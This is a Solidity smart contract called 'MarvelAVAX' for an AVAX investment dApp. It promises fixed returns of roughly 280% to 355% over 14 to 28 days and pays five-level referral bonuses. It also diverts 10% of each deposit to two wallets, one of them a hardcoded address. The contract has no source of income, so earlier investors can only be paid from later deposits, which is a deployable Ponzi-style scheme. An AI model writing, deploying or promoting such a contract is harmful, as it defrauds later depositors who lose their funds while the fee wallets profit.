/**
 *Submitted for verification at testnet.snowtrace.io on 2022-04-07
*/

// SPDX-License-Identifier: MIT License

pragma solidity >=0.8.0;

struct Tarif {
  uint256 life_days;
  uint256 percent;
}

struct Deposit {
  uint256 tarif;
  uint256 amount;
  uint256 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint256 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[5] structure;
}

contract MarvelAVAX {
	using SafeMath for uint256;

    address public d_wallet;
    address public owner;
    address public m_wallet;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    
    uint256 constant BONUS_LINES_COUNT = 5;
    uint256 constant PERCENT_DIVIDER = 1000; // 100 * 10
    uint256[BONUS_LINES_COUNT] public ref_bonuses = [100, 80, 50, 20, 10]; // 10%, 8%, 5%, 2%, 1%

    mapping(uint256 => Tarif) public tarifs;
    mapping(address => Player) public players;

    uint256 public startUNIX;
	address payable private commissionWallet;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint256 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor(address payable wallet) {
		require(!isContract(wallet));
		commissionWallet = wallet;
        startUNIX = block.timestamp.add(365 days);

        m_wallet = msg.sender;
        d_wallet = 0xc5d493A336845c207Be8f0e51752D5B2f46d9A78;
        owner = address(0);

        uint256 tarifPercent = 280;
        for (uint256 tarifDuration = 14; tarifDuration <= 28; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 5;
        }
    }

    function launch() public{
        require(msg.sender == commissionWallet);
        startUNIX = block.timestamp;
    }    


    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint256 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint256 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 0.1 ether, "Minimum deposit amount is 0.1 AVAX");
        require(startUNIX < block.timestamp, "The Contract hasn`t started yet!");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 300, "Max 300 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint256(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        payable(m_wallet).transfer(msg.value / 20);
        payable(d_wallet).transfer(msg.value / 20);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");
        require(startUNIX < block.timestamp, "The Contract hasn`t started yet!");

        uint256 amount = player.dividends + player.match_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint256 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
    
     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}